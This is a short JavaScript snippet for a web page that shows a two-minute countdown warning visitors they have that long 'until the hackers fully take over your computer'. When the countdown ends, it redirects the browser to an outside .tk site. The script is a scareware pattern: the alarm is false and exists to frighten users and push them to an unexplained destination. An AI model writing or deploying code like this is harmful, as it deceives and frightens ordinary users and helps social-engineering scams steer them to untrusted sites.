const a=document.querySelector("#count");
let then = null;
function nf(number, len) {
    let str = number.toString();
    for(let i = str.length; i < len; i++) {
        str = "0" + str;
    }
    return str;
}
setInterval(()=>{
    then = then || Date.now() + 1000 * 119;
    let rem = then - Date.now();
    if(rem < 0) { rem = 0; to() }
    const minutes = Math.floor((rem % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((rem % (1000 * 60)) / 1000);
    a.innerHTML = `You have: 00:${nf(minutes, 2)}:${nf(seconds, 2)} until the hackers fully take over your computer`
}, 1000);
function to() {
    location.href = "https://www.vittra.tk";
}
